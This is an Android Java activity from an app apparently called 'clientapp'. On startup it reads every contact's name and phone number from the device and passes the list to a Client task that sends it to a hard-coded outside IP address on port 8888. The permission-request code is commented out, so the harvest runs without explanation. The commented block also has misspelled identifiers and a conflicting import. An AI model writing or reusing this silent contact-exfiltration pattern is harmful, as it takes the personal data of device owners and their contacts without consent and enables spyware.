package com.example.clientapp;
import java.util.ArrayList;
import Utility.ClientData;

import android.Manifest;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.app.Activity;
import android.content.pm.PackageManager;
import android.database.Cursor;
import androidx.appcompat.app.AppCompatActivity;
import android.view.Menu;
import android.widget.ArrayAdapter;
import android.widget.TextView;
import android.widget.Toast;
import com.example.clientapp.Utility.ClientData;

public class MainActivity extends AppCompatActivity {

    ArrayList<ClientData> StoreContacts;
    ArrayAdapter<String> arrayAdapter;
    Cursor cursor;
    String name, phonenumber;
    public static final int RequestPermissionCode = 1;


    TextView response;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        response = (TextView) findViewById(R.id.textView);

        StoreContacts = new ArrayList<ClientData>();

        //   EnableRuntimePermission();


        GetContactsIntoArrayList();

        Client myClient = new Client("122.168.127.81"
                .toString(), 8888, response, StoreContacts);
        myClient.execute();
    }


    public void GetContactsIntoArrayList() {

        cursor = getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);

        while (cursor.moveToNext()) {

            name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));

            phonenumber = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

            ClientData x = new ClientData();
            x.name = name;
            x.mobile = phonenumber;
            x.email = "ss@ss.com";
            StoreContacts.add(x);
        }

        cursor.close();

    }

    /*
public void EnableRuntimePermission()
{
if(ActivityCompat.shouldShowRequestPermissionRationale(MainActivity.this,
Manifest permission READ_CONTACTS))
{
Toast.makeText(MainActivity.this,"Contacts permission allows us to Access CONTACTS app",
Toast.LENGTH_LONG).show();
}
else
{
ActivityCompat.requestPermissions(MainActivity.this,new String[]
{Manifest.permission.READ_CONTACTS},RequestPermissionCode);
}
}
public void onRequestPermissionResult(int RC,String per[],int[] PResult)
{
switch(RC)
{
case RequestPermissionCode:
if(PResult.length>0 && PResult[0]==PacketManager.PERMISSION_GRANTED)
{
Toast.makeText(MainActivity.this,"Permission Granted,Now Your Application can access CONTACTS.",Toast.LENGTH_LONG).show();
}
else
{
Toast.makeText(MainActivity.this,"Permission Cancelled,Now Your Application cannot access CONTACTS.",Toast.LENGTH_LONG).show();
}
break;
}
}
*/

}

